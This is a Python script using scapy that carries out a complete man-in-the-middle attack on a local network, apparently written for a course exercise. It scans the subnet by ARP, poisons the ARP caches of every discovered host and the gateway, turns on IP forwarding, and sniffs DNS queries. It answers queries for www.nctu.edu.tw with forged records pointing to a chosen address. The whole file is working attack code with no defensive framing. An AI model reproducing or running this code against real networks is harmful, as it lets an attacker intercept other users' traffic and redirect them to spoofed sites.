#!/usr/bin/env python3
import netifaces as ni
import os
from scapy.all import *
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS, DNSRR, DNSQR
import time

class Attack():
    def __init__(self):
        self.ip_list = []
        self.network = []
        self.ip_mac = {}
        self.interfaces = ni.interfaces()
        self.attacker, self.victim, self.ap = '', [], ''

    def _enable_linux_iproute(self):
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                # already enabled
                return
        with open(file_path, "w") as f:
            print(1, file=f)

    def get_ip(self):
        for i in self.interfaces:
            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]
        self.attacker = self.ip_list[1]

    def get_mac(self, network):
        arp_request = scapy.ARP(pdst = network)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
        count = 0
        for sent, received in result:
            self.ip_mac[received.psrc] = received.hwsrc
            if count == 0:
                self.ap = received.psrc
            else:
                self.victim.append(received.psrc)
            count += 1
        self.ip_mac[self.attacker] = scapy.Ether().src

    def spoof(self, target_ip, spoof_ip): 
        target_mac = self.ip_mac[target_ip]
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=0)

    def restore(self, dest_ip, src_ip):
        dest_mac = self.ip_mac[dest_ip]
        src_mac = self.ip_mac[src_ip]
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=0)

    def arp_spoofing(self):
        for v in self.victim:
            self.spoof(v, self.ap)
            self.spoof(self.ap, v)
        time.sleep(0.1)

    def ret_arp_spoofing(self):
        for v in self.victim:
            self.restore(v, self.ap)
            self.restore(self.ap, v)
        exit(0)
    
    def sniff_packets(self):
        for v in self.victim:
            t = scapy.AsyncSniffer(filter='udp dst port 53', prn=self.process_packet, iface=self.interfaces[1], store=0)
            t.start()

    def process_packet(self, packet):
        pkt = packet
        if UDP in pkt and DNS in pkt:
            qname = packet[DNSQR].qname
            if b'www.nctu.edu.tw' in qname:
                cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
                fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246') / DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246'))
                scapy.send(fakeResponse, verbose=0)

attack = Attack()
attack._enable_linux_iproute()
attack.get_ip()
attack.get_mac(attack.network[1])
for v in attack.victim:
    print('victim: ', v, 'mac: ', attack.ip_mac[v])

try:
    attack.sniff_packets()
    while 1:
        attack.arp_spoofing()
except:
    attack.ret_arp_spoofing()
